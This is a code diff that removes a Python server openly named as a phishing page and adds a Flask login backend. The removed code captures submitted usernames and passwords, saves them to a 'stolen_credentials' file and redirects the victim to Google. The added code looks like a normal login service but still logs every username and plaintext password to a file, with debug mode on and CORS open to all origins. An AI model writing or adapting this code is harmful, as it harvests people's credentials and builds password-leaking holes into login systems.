@@ -1,35 +1,33 @@
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import urllib.parse
+from flask import Flask, request, jsonify
+from flask_bcrypt import Bcrypt
+from flask_cors import CORS
+import logging
 
-class PhishingServer(BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
+app = Flask(__name__)
+bcrypt = Bcrypt(app)
+CORS(app)  # Allow frontend to communicate with backend
 
-        # Extract credentials
-        credentials = urllib.parse.parse_qs(post_data)
-        username = credentials.get("username", [""])[0]
-        password = credentials.get("password", [""])[0]
+# Configure logging to write login attempts to a file
+logging.basicConfig(filename='login_attempts.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
-        # Save credentials to a file
-        try:
-            with open("C:/Users/Public/stolen_credentials.txt", "a") as file:
-                file.write(f"Username: {username}, Password: {password}\n")
-        except PermissionError:
-            print("Permission denied: Cannot write to file.")
+# Dummy user database (Replace with real database in production)
+users = {
+    "user@example.com": bcrypt.generate_password_hash("password123").decode('utf-8')
+}
 
-        # Print to console for testing
-        print(f"Captured Credentials -> Username: {username}, Password: {password}")
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.json
+    username = data.get('username')
+    password = data.get('password')
 
-        # Redirect the victim to Google
-        self.send_response(302)
-        self.send_header("Content-type", "text/html")
-        self.send_header("Location", "https://www.google.com")
-        self.end_headers()
+    # Log the login attempt
+    logging.info(f"Login attempt - Username: {username}, Password: {password}")
 
-# Run the fake server
-server_address = ("", 8080)  # Run on port 8080
-httpd = HTTPServer(server_address, PhishingServer)
-print("Phishing page is running on port 8080...")
-httpd.serve_forever()
+    if username in users and bcrypt.check_password_hash(users[username], password):
+        return jsonify({"message": "Login successful", "status": "success"}), 200
+    else:
+        return jsonify({"message": "Invalid credentials", "status": "error"}), 401
 
+if __name__ == '__main__':
+    app.run(debug=True)
